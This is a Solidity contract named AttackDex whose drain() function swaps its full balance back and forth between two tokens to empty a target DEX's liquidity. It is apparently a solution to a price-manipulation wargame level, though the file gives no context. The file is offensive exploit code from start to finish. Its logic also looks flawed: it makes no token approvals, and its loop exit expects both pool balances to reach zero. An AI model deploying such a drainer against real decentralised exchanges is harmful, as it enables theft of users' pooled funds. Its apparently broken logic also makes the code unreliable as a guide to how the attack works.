pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}


contract AttackDex {
    address private token1;
    address private token2;
    address private dexInstance;

    constructor(address _dexInstance) {
        dexInstance = _dexInstance;
        token1 = IDex(dexInstance).token1();
        token2 = IDex(dexInstance).token2();
    }

    function token1Balance() public view returns (uint256) {
        return IERC20(token1).balanceOf(address(this));
    }
   
    function token2Balance() public view returns (uint256) {
        return IERC20(token2).balanceOf(address(this));
    }

    function drain() external {
        
        // Keep draining until the contract has all tokens
        while (true) {
            // If we have token1, swap to get token2
            uint256 balance1 = IERC20(token1).balanceOf(address(this));
            if (balance1 > 0) {
                IDex(dexInstance).swap(token1, token2, balance1);
            }
            
            // If we have token2, swap to get token1
            uint256 balance2 = IERC20(token2).balanceOf(address(this));
            if (balance2 > 0) {
                IDex(dexInstance).swap(token2, token1, balance2);
            }
        
            // Check if we've drained all tokens
            if (IERC20(token1).balanceOf(dexInstance) == 0 && IERC20(token2).balanceOf(dexInstance) == 0) {
                break;
            }
        }
    }
}